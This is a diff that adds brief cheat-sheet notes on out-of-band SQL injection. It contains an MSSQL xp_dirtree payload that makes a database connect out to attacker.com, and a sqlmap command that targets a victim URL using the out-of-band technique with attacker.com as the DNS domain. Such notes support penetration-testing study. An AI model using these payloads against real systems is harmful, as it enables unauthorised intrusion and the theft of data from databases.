@@ -1,0 +1,14 @@
+Out-of-Band (OOB) SQLi
+
+Idea: Data is sent to an attacker-controlled server (DNS/HTTP). Useful when no error, no delay, no output.
+
+Manual Payload Example (MSSQL):
+
+'; exec xp_dirtree '\\attacker.com\share'--
+
+
+DB tries to connect to attacker.com — leaks info to your server.
+
+sqlmap Command:
+
+sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=O --dns-domain=attacker.com
